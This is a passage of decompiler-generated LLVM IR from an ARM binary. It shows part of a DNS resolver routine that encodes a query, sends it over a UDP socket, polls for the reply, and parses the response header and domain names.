  %v2_1d558 = add i32 %v0_1d558, 27364
  %v3_1d558 = inttoptr i32 %v2_1d558 to i32*
  %v4_1d558 = load i32, i32* %v3_1d558, align 4
  store i32 %v1_1d460, i32* %r3.global-to-local, align 4
  store i32 %v3_1d42c, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v0_1d568 = load i32, i32* @sb, align 4
  %v3_1d568 = icmp uge i32 %v0_1d568, %v4_1d558
  store i1 %v3_1d568, i1* %cpsr_c.global-to-local, align 1
  store i8 0, i8* %v5_1d570, align 1
  %v0_1d574 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1d574, label %dec_label_pc_1d5a0, label %dec_label_pc_1d578

dec_label_pc_1d578:                               ; preds = %bb216
  store i32 46, i32* %r3.global-to-local, align 4
  %v3_1d580 = load i32, i32* %ip.global-to-local, align 4
  %v4_1d580 = add i32 %v3_1d580, %v1_1d460
  %v5_1d580 = inttoptr i32 %v4_1d580 to i8*
  store i8 46, i8* %v5_1d580, align 1
  store i32 27352, i32* %r1.global-to-local, align 4
  %v0_1d58c = load i32, i32* @r8, align 4
  %v2_1d58c = add i32 %v0_1d58c, 27352
  %v3_1d58c = inttoptr i32 %v2_1d58c to i32*
  %v4_1d58c = load i32, i32* %v3_1d58c, align 4
  store i32 %v4_1d58c, i32* %r3.global-to-local, align 4
  %v1_1d594 = load i32, i32* %ip.global-to-local, align 4
  %v2_1d594 = add i32 %v1_1d590, %v1_1d594
  %v1_1d598 = load i32, i32* @sb, align 4
  %v2_1d598 = and i32 %v1_1d598, 1073741824
  %v3_1d598 = icmp ne i32 %v2_1d598, 0
  store i1 %v3_1d598, i1* %cpsr_c.global-to-local, align 1
  %v4_1d598 = mul i32 %v1_1d598, 4
  %v5_1d598 = add i32 %v4_1d598, %v4_1d58c
  %v6_1d598 = inttoptr i32 %v5_1d598 to i32*
  %v7_1d598 = load i32, i32* %v6_1d598, align 4
  store i32 %v7_1d598, i32* @r1, align 4
  %v2_1d59c = inttoptr i32 %v2_1d594 to i8*
  %v3_1d59c = call i32 @strcpy(i8* %v2_1d59c, i32 %v7_1d598)
  br label %dec_label_pc_1d5a0

dec_label_pc_1d5a0:                               ; preds = %bb216, %dec_label_pc_1d578
  store i32 %stack_var_-468.0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1d5a4 = icmp slt i32 %stack_var_-468.0, 0
  br i1 %v1_1d5a4, label %dec_label_pc_1d5ac, label %dec_label_pc_1d5a0.dec_label_pc_1d5dc_crit_edge

dec_label_pc_1d5a0.dec_label_pc_1d5dc_crit_edge:  ; preds = %dec_label_pc_1d5a0
  %v0_1d5e4.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1d5dc

dec_label_pc_1d5ac:                               ; preds = %dec_label_pc_1d5a0
  store i32 27360, i32* %r3.global-to-local, align 4
  store i32 1131, i32* %ip.global-to-local, align 4
  %v0_1d5b4 = load i32, i32* @r8, align 4
  %v2_1d5b4 = add i32 %v0_1d5b4, 27360
  %v3_1d5b4 = inttoptr i32 %v2_1d5b4 to i32*
  %v4_1d5b4 = load i32, i32* %v3_1d5b4, align 4
  %v2_1d5b8 = add i32 %v0_1d5b4, 1131
  %v3_1d5b8 = inttoptr i32 %v2_1d5b8 to i8*
  %v4_1d5b8 = load i8, i8* %v3_1d5b8, align 1
  %v6_1d5b8 = zext i8 %v4_1d5b8 to i32
  %v2_1d5bc = mul i32 %v6_1d5b8, %v4_1d5b4
  store i32 %v2_1d5bc, i32* %r3.global-to-local, align 4
  store i32 26316, i32* %r1.global-to-local, align 4
  %v2_1d5c8 = add i32 %v0_1d5b4, 1128
  %v3_1d5c8 = inttoptr i32 %v2_1d5c8 to i16*
  %v4_1d5c8 = load i16, i16* %v3_1d5c8, align 2
  %v6_1d5c8 = zext i16 %v4_1d5c8 to i32
  %v2_1d5cc = add i32 %v0_1d5b4, 26316
  %v3_1d5cc = inttoptr i32 %v2_1d5cc to i32*
  %v4_1d5cc = load i32, i32* %v3_1d5cc, align 4
  store i32 %v4_1d5cc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1d5dc

dec_label_pc_1d5dc:                               ; preds = %dec_label_pc_1d5a0.dec_label_pc_1d5dc_crit_edge, %dec_label_pc_1d5ac
  %v2_1d620 = phi i32 [ %v0_1d5b4, %dec_label_pc_1d5ac ], [ %v0_1d5e4.pre, %dec_label_pc_1d5a0.dec_label_pc_1d5dc_crit_edge ]
  %stack_var_-464.1 = phi i32 [ %v6_1d5c8, %dec_label_pc_1d5ac ], [ %stack_var_-464.0, %dec_label_pc_1d5a0.dec_label_pc_1d5dc_crit_edge ]
  %stack_var_-468.1 = phi i32 [ %v4_1d5cc, %dec_label_pc_1d5ac ], [ %stack_var_-468.0, %dec_label_pc_1d5a0.dec_label_pc_1d5dc_crit_edge ]
  %stack_var_-476.1 = phi i32 [ %v2_1d5bc, %dec_label_pc_1d5ac ], [ %stack_var_-476.0, %dec_label_pc_1d5a0.dec_label_pc_1d5dc_crit_edge ]
  store i32 27360, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-468.1, i32* %ip.global-to-local, align 4
  %v2_1d5e4 = add i32 %v2_1d620, 27360
  %v3_1d5e4 = inttoptr i32 %v2_1d5e4 to i32*
  %v4_1d5e4 = load i32, i32* %v3_1d5e4, align 4
  store i32 27356, i32* %r3.global-to-local, align 4
  %v3_1d5ec = icmp uge i32 %stack_var_-468.1, %v4_1d5e4
  store i1 %v3_1d5ec, i1* %cpsr_c.global-to-local, align 1
  %v2_1d5f0 = add i32 %v2_1d620, 27356
  %v3_1d5f0 = inttoptr i32 %v2_1d5f0 to i32*
  %v4_1d5f0 = load i32, i32* %v3_1d5f0, align 4
  store i32 %v4_1d5f0, i32* %r3.global-to-local, align 4
  br i1 %v3_1d5ec, label %bb217, label %bb218

bb217:                                            ; preds = %dec_label_pc_1d5dc
  store i32 0, i32* %ip.global-to-local, align 4
  br label %bb218

bb218:                                            ; preds = %dec_label_pc_1d5dc, %bb217
  %v0_1d5fc = phi i32 [ %stack_var_-468.1, %dec_label_pc_1d5dc ], [ 0, %bb217 ]
  %v3_1d5fc = mul i32 %v0_1d5fc, 28
  %v4_1d5fc = add i32 %v3_1d5fc, %v4_1d5f0
  store i32 %v4_1d5fc, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-464.1, i32* %ip.global-to-local, align 4
  %v1_1d608 = add i32 %stack_var_-464.1, 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_1d614 = urem i32 %v1_1d608, 65536
  store i32 26316, i32* %r1.global-to-local, align 4
  %v1_1d620 = trunc i32 %v1_1d608 to i16
  %v4_1d620 = add i32 %v2_1d620, 1128
  %v5_1d620 = inttoptr i32 %v4_1d620 to i16*
  store i16 %v1_1d620, i16* %v5_1d620, align 2
  %v1_1d628 = load i32, i32* @r8, align 4
  %v2_1d628 = load i32, i32* %r1.global-to-local, align 4
  %v3_1d628 = add i32 %v2_1d628, %v1_1d628
  %v4_1d628 = inttoptr i32 %v3_1d628 to i32*
  store i32 %v0_1d5fc, i32* %v4_1d628, align 4
  %v0_1d62c = load i32, i32* %r3.global-to-local, align 4
  %v1_1d630 = inttoptr i32 %v0_1d62c to i32*
  %v2_1d630 = load i32, i32* %v1_1d630, align 4
  %v3_1d630 = add i32 %v0_1d62c, 4
  %v4_1d630 = inttoptr i32 %v3_1d630 to i32*
  %v5_1d630 = load i32, i32* %v4_1d630, align 4
  store i32 %v5_1d630, i32* %r1.global-to-local, align 4
  %v9_1d630 = add i32 %v0_1d62c, 12
  %v10_1d630 = inttoptr i32 %v9_1d630 to i32*
  %v11_1d630 = load i32, i32* %v10_1d630, align 4
  store i32 %v11_1d630, i32* %r3.global-to-local, align 4
  %v12_1d630 = add i32 %v0_1d62c, 16
  %v4_1d638 = trunc i32 %v2_1d630 to i16
  store i16 %v4_1d638, i16* %stack_var_-104, align 2
  store i32 %v15_1d638, i32* %ip.global-to-local, align 4
  %v1_1d63c = inttoptr i32 %v12_1d630 to i32*
  %v2_1d63c = load i32, i32* %v1_1d63c, align 4
  %v3_1d63c = add i32 %v0_1d62c, 20
  %v4_1d63c = inttoptr i32 %v3_1d63c to i32*
  %v5_1d63c = load i32, i32* %v4_1d63c, align 4
  store i32 %v5_1d63c, i32* %r1.global-to-local, align 4
  store i32 28, i32* %r3.global-to-local, align 4
  store i32 %v2_1d63c, i32* %stack_var_-88, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_1d650 = load i32, i32* @r8, align 4
  %v2_1d650 = add i32 %v0_1d650, 28
  %v3_1d650 = inttoptr i32 %v2_1d650 to i32*
  %v4_1d650 = load i32, i32* %v3_1d650, align 4
  store i32 %v4_1d650, i32* %ip.global-to-local, align 4
  store i32 120412, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1d650)
  store i32 %v2_1d65c, i32* @r6, align 4
  %v0_1d660 = load i32, i32* @r7, align 4
  store i32 %v0_1d660, i32* %r1.global-to-local, align 4
  store i32 512, i32* @r2, align 4
  %v0_1d668 = load i32, i32* @sl, align 4
  %v2_1d66c = inttoptr i32 %v0_1d668 to i8*
  %v3_1d66c = call i32 @__GI_memset(i8* %v2_1d66c, i32 %v0_1d660)
  %v0_1d670 = load i32, i32* @r7, align 4
  store i32 %v0_1d670, i32* %r1.global-to-local, align 4
  store i32 48, i32* @r2, align 4
  %v3_1d67c = call i32 @__GI_memset(i8* %v2_1d67c, i32 %v0_1d670)
  store i32 %v3_1d614, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r5, align 4
  %v0_1d68c = load i32, i32* @sl, align 4
  store i32 %v0_1d68c, i32* %r1.global-to-local, align 4
  store i32 %v3_1d614, i32* %stack_var_-192, align 4
  %v6_1d6a0 = call i32 @__encode_header(i32* nonnull %stack_var_-192, i32 %v0_1d68c, i32 512, i32 %v3_1d614, i32 %v3_1d614)
  store i32 %v6_1d6a0, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1d6a4 = icmp slt i32 %v6_1d6a0, 0
  br i1 %v1_1d6a4, label %dec_label_pc_1db60, label %dec_label_pc_1d6ac

dec_label_pc_1d6ac:                               ; preds = %bb218
  store i32 %v0_1d418, i32* @ip, align 4
  store i32 %v1_1d460, i32* @r5, align 4
  %v0_1d6bc = load i32, i32* @sl, align 4
  %v2_1d6bc = add i32 %v0_1d6bc, %v6_1d6a0
  store i32 %v2_1d6bc, i32* %r1.global-to-local, align 4
  %v1_1d6c0 = sub i32 512, %v6_1d6a0
  store i32 %v1_1d460, i32* %stack_var_-60, align 4
  store i32 %v0_1d418, i32* %stack_var_-56, align 4
  %v4_1d6cc = call i32 @__encode_question(i32* nonnull %stack_var_-60, i32 %v2_1d6bc, i32 %v1_1d6c0)
  store i32 %v4_1d6cc, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1d6d0 = icmp slt i32 %v4_1d6cc, 0
  br i1 %v1_1d6d0, label %dec_label_pc_1db60, label %dec_label_pc_1d6d8

dec_label_pc_1d6d8:                               ; preds = %dec_label_pc_1d6ac
  %v3_1d6dc = load i16, i16* %stack_var_-104, align 2
  %v4_1d6dc = sext i16 %v3_1d6dc to i32
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_1d6e8 = call i32 @socket(i32 %v4_1d6dc, i32 2, i32 17)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1d6ec = icmp slt i32 %v3_1d6e8, 0
  br i1 %v1_1d6ec, label %dec_label_pc_1db38, label %dec_label_pc_1d6f8

dec_label_pc_1d6f8:                               ; preds = %dec_label_pc_1d6d8
  store i32 %v2_1d634, i32* %r1.global-to-local, align 4
  %v3_1d700 = call i32 @__libc_connect(i32 %v3_1d6e8, i32 %v2_1d634, i32 28)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1d704 = icmp slt i32 %v3_1d700, 0
  br i1 %v1_1d704, label %dec_label_pc_1db38, label %dec_label_pc_1d70c

dec_label_pc_1d70c:                               ; preds = %dec_label_pc_1d6f8
  %v0_1d70c = load i32, i32* @r5, align 4
  %v1_1d70c = load i32, i32* @r4, align 4
  %v2_1d70c = add i32 %v1_1d70c, %v0_1d70c
  %v0_1d710 = load i32, i32* @r7, align 4
  store i32 %v0_1d710, i32* %r3.global-to-local, align 4
  %v0_1d718 = load i32, i32* @sl, align 4
  store i32 %v0_1d718, i32* %r1.global-to-local, align 4
  %v4_1d71c = call i32 @__libc_send(i32 %v3_1d6e8, i32 %v0_1d718, i32 %v2_1d70c, i32 %v0_1d710)
  store i32 1130, i32* %r3.global-to-local, align 4
  %v0_1d724 = load i32, i32* @r8, align 4
  %v2_1d724 = add i32 %v0_1d724, 1130
  %v3_1d724 = inttoptr i32 %v2_1d724 to i8*
  %v4_1d724 = load i8, i8* %v3_1d724, align 1
  %v6_1d724 = zext i8 %v4_1d724 to i32
  store i32 1000, i32* %r3.global-to-local, align 4
  %v2_1d72c = mul nuw nsw i32 %v6_1d724, 1000
  store i32 %v2_1d72c, i32* @r4, align 4
  store i32 %v2_1d730, i32* @r5, align 4
  br label %dec_label_pc_1d734

dec_label_pc_1d734:                               ; preds = %thread-pre-split, %dec_label_pc_1d70c
  %v0_1d740 = phi i32 [ %v1_1d780, %thread-pre-split ], [ %v2_1d72c, %dec_label_pc_1d70c ]
  store i32 %v3_1d6e8, i32* %r3.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  store i32 %v2_1d73c, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v3_1d6e8, i32* %stack_var_-48, align 4
  %v7_1d754 = call i32 @__GI_poll(i32 %v2_1d730, i32 1, i32 %v0_1d740, i32 %v3_1d6e8, i32 %v3_1d6e8, i32 1)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v0_1d75c = load i32, i32* @sl, align 4
  store i32 %v0_1d75c, i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %tmp219 = icmp slt i32 %v7_1d754, 1
  br i1 %tmp219, label %dec_label_pc_1db38, label %dec_label_pc_1d770

dec_label_pc_1d770:                               ; preds = %dec_label_pc_1d734
  %v5_1d770 = call i32 @__libc_recv(i32 %v3_1d6e8, i32 %v0_1d75c, i32 512, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v2_1d774 = icmp ugt i32 %v5_1d770, 10
  store i1 %v2_1d774, i1* %cpsr_c.global-to-local, align 1
  %v8_1d77c = icmp sgt i32 %v5_1d770, 11
  br i1 %v8_1d77c, label %dec_label_pc_1d7a8, label %dec_label_pc_1d780

dec_label_pc_1d780:                               ; preds = %dec_label_pc_1d7a8, %dec_label_pc_1d7c4, %dec_label_pc_1d770
  %v0_1d780 = load i32, i32* @r4, align 4
  %v1_1d780 = add i32 %v0_1d780, -1000
  store i32 %v1_1d780, i32* @r4, align 4
  %v7_1d780 = icmp eq i32 %v0_1d780, 1000
  %tmp283 = zext i1 %v7_1d780 to i32
  %. = xor i32 %tmp283, 1
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1d790 = icmp slt i32 %v5_1d770, 0
  br i1 %v1_1d790, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_1d780
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_1db38

thread-pre-split:                                 ; preds = %dec_label_pc_1d780
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_1d780, label %dec_label_pc_1db38, label %dec_label_pc_1d734

dec_label_pc_1d7a8:                               ; preds = %dec_label_pc_1d770
  store i32 %v2_1d65c, i32* %r1.global-to-local, align 4
  %v0_1d7ac = load i32, i32* @sl, align 4
  %v2_1d7b0 = inttoptr i32 %v0_1d7ac to i8*
  %v3_1d7b0 = call i32 @__decode_header(i8* %v2_1d7b0, i32 %v2_1d65c)
  %v3_1d7b4 = load i32, i32* %stack_var_-192, align 4
  store i32 %v3_1d7b4, i32* %r3.global-to-local, align 4
  store i32 %v3_1d614, i32* %r1.global-to-local, align 4
  %v3_1d7bc = icmp uge i32 %v3_1d7b4, %v3_1d614
  store i1 %v3_1d7bc, i1* %cpsr_c.global-to-local, align 1
  %v9_1d7bc = icmp eq i32 %v3_1d7b4, %v3_1d614
  br i1 %v9_1d7bc, label %dec_label_pc_1d7c4, label %dec_label_pc_1d780

dec_label_pc_1d7c4:                               ; preds = %dec_label_pc_1d7a8
  store i32 %tmp161, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_1d7c8, label %dec_label_pc_1d780, label %dec_label_pc_1d7d0

dec_label_pc_1d7d0:                               ; preds = %dec_label_pc_1d7c4
  store i32 %v1_1d7d4, i32* %r3.global-to-local, align 4
  store i1 %v2_1d7d8, i1* %cpsr_c.global-to-local, align 1
  br i1 %v1_1d7d4.cmp, label %dec_label_pc_1d80c, label %dec_label_pc_1d7e0

dec_label_pc_1d7e0:                               ; preds = %dec_label_pc_1d7d0
  store i1 %v2_1d7e4, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_1d7e4, label %dec_label_pc_1d800, label %dec_label_pc_1d7ec

dec_label_pc_1d7ec:                               ; preds = %dec_label_pc_1d7e0
  store i32 %v4_1d558, i32* @r5, align 4
  %v1_1d7f0 = add i32 %v4_1d558, -1
  store i32 %v1_1d7f0, i32* %r3.global-to-local, align 4
  %v0_1d7f4 = load i32, i32* @sb, align 4
  %v3_1d7f4 = icmp uge i32 %v0_1d7f4, %v1_1d7f0
  store i1 %v3_1d7f4, i1* %cpsr_c.global-to-local, align 1
  %v5_1d7f8 = icmp slt i32 %v0_1d7f4, %v1_1d7f0
  br i1 %v5_1d7f8, label %.thread7, label %dec_label_pc_1d800

.thread7:                                         ; preds = %dec_label_pc_1d7ec
  %v7_1d7f8 = add i32 %v0_1d7f4, 1
  br label %dec_label_pc_1db48

dec_label_pc_1d800:                               ; preds = %dec_label_pc_1d7ec, %dec_label_pc_1d7e0
  %v0_1d800 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_1d834

dec_label_pc_1d80c:                               ; preds = %dec_label_pc_1d7d0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_1d80c, label %dec_label_pc_1d814, label %dec_label_pc_1db38

dec_label_pc_1d814:                               ; preds = %dec_label_pc_1d80c
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %tmp214, label %dec_label_pc_1d82c, label %dec_label_pc_1d83c

dec_label_pc_1d82c:                               ; preds = %dec_label_pc_1d814
  %v0_1d82c = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_1d834

dec_label_pc_1d834:                               ; preds = %dec_label_pc_1d800, %dec_label_pc_1d82c
  %storemerge2 = phi i32 [ %v0_1d82c, %dec_label_pc_1d82c ], [ %v0_1d800, %dec_label_pc_1d800 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_1d82c ], [ 1, %dec_label_pc_1d800 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v2_1d834 = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_1d834, align 4
  br label %dec_label_pc_1db80

dec_label_pc_1d83c:                               ; preds = %dec_label_pc_1d814
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_1d840.pre = load i32, i32* @sl, align 4
  store i32 12, i32* @ip, align 4
  %v2_1d840 = add i32 %v0_1d840.pre, 12
  store i32 %v2_1d840, i32* @r4, align 4
  %v3_1d840 = icmp ugt i32 %v0_1d840.pre, -13
  store i1 %v3_1d840, i1* %cpsr_c.global-to-local, align 1
  %v9_1d840 = icmp eq i32 %v2_1d840, 0
  br i1 %v9_1d840, label %dec_label_pc_1db38, label %dec_label_pc_1d848

dec_label_pc_1d848:                               ; preds = %dec_label_pc_1d83c
  %v2_1d84c = add i32 %v5_1d770, -12
  store i32 %v2_1d84c, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp223 = icmp slt i32 %v2_1d84c, 1
  br i1 %tmp223, label %dec_label_pc_1db38, label %dec_label_pc_1d85c

dec_label_pc_1d854thread-pre-split:               ; preds = %dec_label_pc_1d878
  %v2_1d88415 = add i32 %v2_1d868, -1
  store i32 %v2_1d88415, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp224 = icmp slt i32 %v2_1d88415, 1
  br i1 %tmp224, label %dec_label_pc_1db38, label %dec_label_pc_1d85c

dec_label_pc_1d85c:                               ; preds = %dec_label_pc_1d848, %dec_label_pc_1d854thread-pre-split
  %v1_1d880 = phi i32 [ %v2_1d88415, %dec_label_pc_1d854thread-pre-split ], [ %v2_1d84c, %dec_label_pc_1d848 ]
  %v0_1d85c = phi i32 [ %v2_1d870, %dec_label_pc_1d854thread-pre-split ], [ %v2_1d840, %dec_label_pc_1d848 ]
  %v1_1d85c = inttoptr i32 %v0_1d85c to i8*
  %v2_1d85c = load i8, i8* %v1_1d85c, align 1
  %v3_1d85c = zext i8 %v2_1d85c to i32
  store i32 %v3_1d85c, i32* %r3.global-to-local, align 4
  %v5_1d85c = add i32 %v0_1d85c, 1
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1d860 = icmp eq i8 %v2_1d85c, 0
  %v2_1d868 = sub i32 %v1_1d880, %v3_1d85c
  store i32 %v2_1d868, i32* @lr, align 4
  %v1_1d86c = and i32 %v3_1d85c, 192
  store i32 %v1_1d86c, i32* @ip, align 4
  %v2_1d870 = add i32 %v3_1d85c, %v5_1d85c
  br i1 %v2_1d860, label %dec_label_pc_1d88c, label %dec_label_pc_1d878

dec_label_pc_1d878:                               ; preds = %dec_label_pc_1d85c
  %v2_1d878 = icmp eq i32 %v1_1d86c, 192
  store i1 %v2_1d878, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_1d878, label %.thread9, label %dec_label_pc_1d854thread-pre-split

.thread9:                                         ; preds = %dec_label_pc_1d878
  %v2_1d87c = add i32 %v0_1d85c, 2
  %v2_1d880 = add i32 %v1_1d880, -2
  store i32 %v2_1d880, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1d88c

dec_label_pc_1d88c:                               ; preds = %dec_label_pc_1d85c, %.thread9
  %v1_1d898 = phi i32 [ %v2_1d87c, %.thread9 ], [ %v5_1d85c, %dec_label_pc_1d85c ]
  %v0_1d88c = phi i32 [ %v2_1d880, %.thread9 ], [ %v1_1d880, %dec_label_pc_1d85c ]
  %v1_1d88c = add i32 %v0_1d88c, -3
  %v2_1d88c = icmp ugt i32 %v0_1d88c, 2
  store i1 %v2_1d88c, i1* %cpsr_c.global-to-local, align 1
  %v3_1d88c = sub i32 2, %v0_1d88c
  %v4_1d88c = and i32 %v3_1d88c, %v0_1d88c
  %v5_1d88c = icmp slt i32 %v4_1d88c, 0
  %v6_1d88c = icmp slt i32 %v1_1d88c, 0
  %v7_1d88c = icmp eq i32 %v0_1d88c, 3
  %v3_1d890 = xor i1 %v6_1d88c, %v5_1d88c
  %v4_1d890 = or i1 %v7_1d88c, %v3_1d890
  br i1 %v4_1d890, label %dec_label_pc_1db38, label %dec_label_pc_1d894

dec_label_pc_1d894:                               ; preds = %dec_label_pc_1d88c
  %v1_1d894 = sub i32 -8, %v0_1d840.pre
  %v2_1d898 = add i32 %v1_1d898, %v1_1d894
  store i32 %v2_1d898, i32* %r3.global-to-local, align 4
  %v3_1d898 = icmp ult i32 %v2_1d898, %v1_1d894
  store i1 %v3_1d898, i1* %cpsr_c.global-to-local, align 1
  %v8_1d898 = icmp slt i32 %v2_1d898, 0
  br i1 %v8_1d898, label %dec_label_pc_1db38, label %dec_label_pc_1d8bc

dec_label_pc_1d8bc:                               ; preds = %dec_label_pc_1d894
  %v2_1d8a4 = add i32 %v2_1d898, 12
  store i32 %v2_1d8a4, i32* %r1.global-to-local, align 4
  store i32 %v2_1d8c4, i32* @r5, align 4
  store i32 %v2_1d8c8, i32* @r7, align 4
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br i1 %v5_1db0c56, label %dec_label_pc_1d8e0, label %dec_label_pc_1db10

dec_label_pc_1d8e0:                               ; preds = %dec_label_pc_1d8bc, %dec_label_pc_1dae8.dec_label_pc_1d8e0_crit_edge
  %v0_1d8e4 = phi i32 [ %v0_1d8e4.pre, %dec_label_pc_1dae8.dec_label_pc_1d8e0_crit_edge ], [ %v0_1d840.pre, %dec_label_pc_1d8bc ]
  %stack_var_-460.364 = phi i32 [ %v2_1daf0, %dec_label_pc_1dae8.dec_label_pc_1d8e0_crit_edge ], [ %v2_1d8a4, %dec_label_pc_1d8bc ]
  %stack_var_-452.061 = phi i32 [ %v1_1daf4, %dec_label_pc_1dae8.dec_label_pc_1d8e0_crit_edge ], [ 0, %dec_label_pc_1d8bc ]
  %stack_var_-480.260 = phi i32 [ %stack_var_-480.1, %dec_label_pc_1dae8.dec_label_pc_1d8e0_crit_edge ], [ 1, %dec_label_pc_1d8bc ]
  store i32 256, i32* @ip, align 4
  store i32 %stack_var_-460.364, i32* @r1, align 4
  store i32 %v2_1d8c4, i32* %r3.global-to-local, align 4
  %v5_1d8f8 = call i32 @__decode_dotted(i32 %v0_1d8e4, i32 %stack_var_-460.364, i32 %v5_1d770, i32 %v2_1d8c4, i32 256)
  store i32 %v5_1d8f8, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1d8fc = icmp slt i32 %v5_1d8f8, 0
  br i1 %v1_1d8fc, label %dec_label_pc_1d9cc, label %dec_label_pc_1d904

dec_label_pc_1d904:                               ; preds = %dec_label_pc_1d8e0
  store i32 %stack_var_-460.364, i32* %r1.global-to-local, align 4
  %v1_1d90c = add i32 %v5_1d8f8, 10
  store i32 %v1_1d90c, i32* @sb, align 4
  %v2_1d910 = sub i32 %v5_1d770, %stack_var_-460.364
  %v2_1d914 = sub i32 %v2_1d910, %v1_1d90c
  store i32 %v2_1d914, i32* %r3.global-to-local, align 4
  %v3_1d914 = icmp uge i32 %v2_1d910, %v1_1d90c
  store i1 %v3_1d914, i1* %cpsr_c.global-to-local, align 1
  %v8_1d914 = icmp slt i32 %v2_1d914, 0
  br i1 %v8_1d914, label %dec_label_pc_1d9c4.thread, label %dec_label_pc_1d924

dec_label_pc_1d9c4.thread:                        ; preds = %dec_label_pc_1d904
  store i32 %v2_1d914, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_1d9cc

dec_label_pc_1d924:                               ; preds = %dec_label_pc_1d904
  %v2_1d928 = call i32 @__GI_strdup(i8* %v1_1d928)
  %v0_1d930 = load i32, i32* @r4, align 4
  %v2_1d930 = add i32 %v0_1d930, %stack_var_-460.364
  %v0_1d934 = load i32, i32* @sl, align 4
  %v2_1d934 = add i32 %v0_1d934, %v2_1d930
  store i32 %v2_1d934, i32* %r1.global-to-local, align 4
  %v1_1d938 = add i32 %v2_1d934, 2
  store i32 %v1_1d938, i32* %ip.global-to-local, align 4
  %v1_1d93c = add i32 %v2_1d934, 4
  store i32 %v1_1d93c, i32* %r3.global-to-local, align 4
  %v1_1d940 = add i32 %v2_1d934, 5
  %v2_1d940 = inttoptr i32 %v1_1d940 to i8*
  %v3_1d940 = load i8, i8* %v2_1d940, align 1
  %v4_1d940 = zext i8 %v3_1d940 to i32
  %v1_1d948 = add i32 %v2_1d934, 8
  %v2_1d948 = inttoptr i32 %v1_1d948 to i8*
  %v3_1d948 = load i8, i8* %v2_1d948, align 1
  %v4_1d948 = zext i8 %v3_1d948 to i32
  %v1_1d954 = add i32 %v2_1d934, 6
  %v2_1d954 = inttoptr i32 %v1_1d954 to i8*
  %v3_1d954 = load i8, i8* %v2_1d954, align 1
  %v4_1d954 = zext i8 %v3_1d954 to i32
  store i32 %v4_1d954, i32* %r3.global-to-local, align 4
  %v1_1d958 = add i32 %v2_1d934, 9
  %v2_1d958 = inttoptr i32 %v1_1d958 to i8*
  %v3_1d958 = load i8, i8* %v2_1d958, align 1
  %v4_1d958 = zext i8 %v3_1d958 to i32
  %v3_1d960 = inttoptr i32 %v2_1d934 to i8*
  %v4_1d960 = load i8, i8* %v3_1d960, align 1
  %v6_1d960 = zext i8 %v4_1d960 to i32
  %v1_1d964 = add i32 %v2_1d934, 3
  %v2_1d964 = inttoptr i32 %v1_1d964 to i8*
  %v3_1d964 = load i8, i8* %v2_1d964, align 1
  %v4_1d964 = zext i8 %v3_1d964 to i32
  store i32 %v4_1d964, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v2_1d96c = inttoptr i32 %v1_1d938 to i8*
  %v3_1d96c = load i8, i8* %v2_1d96c, align 1
  %v4_1d96c = zext i8 %v3_1d96c to i32
  store i32 %v4_1d96c, i32* %ip.global-to-local, align 4
  %v1_1d970 = add i32 %v2_1d934, 1
  %v2_1d970 = inttoptr i32 %v1_1d970 to i8*
  %v3_1d970 = load i8, i8* %v2_1d970, align 1
  %v4_1d970 = zext i8 %v3_1d970 to i32
  %v4_1d974 = mul nuw nsw i32 %v4_1d948, 256
  %v5_1d974 = or i32 %v4_1d958, %v4_1d974
  store i32 %v5_1d974, i32* @r6, align 4
  store i32 %v4_1d940, i32* @r7, align 4
  %v4_1d97c = mul nuw nsw i32 %v6_1d960, 256
